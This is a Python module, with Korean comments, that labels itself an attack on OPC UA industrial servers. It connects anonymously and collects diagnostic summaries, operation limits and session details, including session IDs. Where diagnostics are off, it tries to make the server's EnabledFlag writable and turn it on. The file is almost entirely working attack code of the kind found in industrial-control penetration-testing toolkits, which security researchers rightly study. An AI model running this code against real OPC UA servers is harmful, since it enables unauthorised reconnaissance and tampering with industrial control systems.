# 익명으로 서버에서 진단 데이터를 가져오는 공격
# 이 코드는 특정 OPC UA 서버에서 진단 데이터를 가져오고, 만약 가능하면 데이터를 변경하여 서버의 상태를 확인하는 데 사용됩니다.

import asyncua as opcua
from asyncua import ua
import asyncio

# 공격 함수 (비동기 함수로 구현)
def attack(server_details):
    asyncio.run(attack_impl(server_details))

# 공격 실행 함수
async def attack_impl(server_details):
    program_type, ip_addr, port, query_string = server_details
    # 클라이언트 세션 생성
    async with opcua.Client(f"opc.tcp://{ip_addr}:{port}{query_string}") as client:
        try:
            print(f"[-] Retrieving Diagnostic Object")

            # 진단 정보 수집
            try:
                # 서버 진단 플래그 확인
                enable_flag = client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_EnabledFlag))
                diag_enabled = await enable_flag.get_value()
                
                # 진단이 활성화된 경우 정보 출력
                if diag_enabled:
                    print(f"[-] Diagnostics enabled")
                else:
                    # 진단이 비활성화된 경우 활성화 시도
                    print("[-] Diagnostics disabled, enabling")
                    await enable_flag.set_writable(True)
                    await enable_flag.set_value(True)

                print(f"[-] Retrieving info...")

                # 서버 진단 정보 수집 (각 진단 노드의 값)
                ServerViewCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_ServerViewCount))).get_value()
                CurrentSessionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CurrentSessionCount))).get_value()
                CumulatedSessionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CumulatedSessionCount))).get_value()
                SecurityRejectedSessionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SecurityRejectedSessionCount))).get_value()
                SessionTimeoutCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SessionTimeoutCount))).get_value()
                SessionAbortCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SessionAbortCount))).get_value()
                PublishingIntervalCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_PublishingIntervalCount))).get_value()
                CurrentSubscriptionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CurrentSubscriptionCount))).get_value()
                CumulatedSubscriptionCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_CumulatedSubscriptionCount))).get_value()
                SecurityRejectedRequestsCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_SecurityRejectedRequestsCount))).get_value()
                RejectedRequestsCount = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_ServerDiagnosticsSummary_RejectedRequestsCount))).get_value()

                # 진단 데이터 출력
                print("[-] Summary:")
                print(f"    ServerViewCount: {ServerViewCount}")
                print(f"    CurrentSessionCount: {CurrentSessionCount}")
                print(f"    CumulatedSessionCount: {CumulatedSessionCount}")
                print(f"    SecurityRejectedSessionCount: {SecurityRejectedSessionCount}")
                print(f"    SessionTimeoutCount: {SessionTimeoutCount}")
                print(f"    SessionAbortCount: {SessionAbortCount}")
                print(f"    PublishingIntervalCount: {PublishingIntervalCount}")
                print(f"    CurrentSubscriptionCount: {CurrentSubscriptionCount}")
                print(f"    CumulatedSubscriptionCount: {CumulatedSubscriptionCount}")
                print(f"    SecurityRejectedRequestsCount: {SecurityRejectedRequestsCount}")
                print(f"    RejectedRequestsCount: {RejectedRequestsCount}")

                try:
                    # 서버의 동작 한계 정보 수집
                    OperationLimits_MaxNodesPerRead = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerRead))).get_value()
                    OperationLimits_MaxNodesPerWrite = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerWrite))).get_value()
                    OperationLimits_MaxNodesPerMethodCall = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerMethodCall))).get_value()
                    OperationLimits_MaxNodesPerBrowse = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerBrowse))).get_value()
                    OperationLimits_MaxNodesPerRegisterNodes = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerRegisterNodes))).get_value()
                    OperationLimits_MaxNodesPerTranslateBrowsePathsToNodeIds = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerTranslateBrowsePathsToNodeIds))).get_value()
                    OperationLimits_MaxNodesPerNodeManagement = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxNodesPerNodeManagement))).get_value()
                    OperationLimits_MaxMonitoredItemsPerCall = await (client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerCapabilities_OperationLimits_MaxMonitoredItemsPerCall))).get_value()

                    print("[-] Limits:")
                    print(f"    MaxNodesPerRead: {OperationLimits_MaxNodesPerRead}")
                    print(f"    MaxNodesPerWrite: {OperationLimits_MaxNodesPerWrite}")
                    print(f"    MaxNodesPerMethodCall: {OperationLimits_MaxNodesPerMethodCall}")
                    print(f"    MaxNodesPerBrowse: {OperationLimits_MaxNodesPerBrowse}")
                    print(f"    MaxNodesPerRegisterNodes: {OperationLimits_MaxNodesPerRegisterNodes}")
                    print(f"    MaxNodesPerTranslateBrowsePathsToNodeIds: {OperationLimits_MaxNodesPerTranslateBrowsePathsToNodeIds}")
                    print(f"    MaxNodesPerNodeManagement: {OperationLimits_MaxNodesPerNodeManagement}")
                    print(f"    MaxMonitoredItemsPerCall: {OperationLimits_MaxMonitoredItemsPerCall}")
                except Exception as e:
                    print(f"[X] Could not get Operation Limits: {e}")

                # 세션 정보 출력
                print("[-] Sessions:")
                sessions_summery = client.get_node(ua.FourByteNodeId(ua.ObjectIds.Server_ServerDiagnostics_SessionsDiagnosticsSummary))

                for child in await sessions_summery.get_children():
                    elements = await child.get_value()
                    for elem in elements:
                        for attr, value in elem.__dict__.items():
                            if attr == "SessionId":
                                print("-" * 120)

                            if 'asyncua' in str(type(value)):
                                print(f"        {attr:45}")
                                for attr1, value1 in value.__dict__.items():
                                    print(f"                {attr1:38} {value1}")
                            else:
                                print(f"        {attr:45}  {value}")

            # 진단 플래그 비활성화 및 쓰기 불가능할 때의 예외 처리
            except ua.uaerrors._auto.BadWriteNotSupported as e:
                print("[X] Enable flag is disabled and not writable")
                print("[X] Exiting...")
                exit()

            # 진단 플래그의 ID가 존재하지 않을 때의 예외 처리
            except ua.uaerrors._auto.BadNodeIdUnknown as e:
                print(f"[X] Enable flag either does not exist or has another id than default: {ua.ObjectIds.Server_ServerDiagnostics_EnabledFlag}")
                print("[X] Exiting...")
                exit()

        # 일반적인 예외 처리
        except Exception as e:
            print(f"[X] ERROR: {e}")
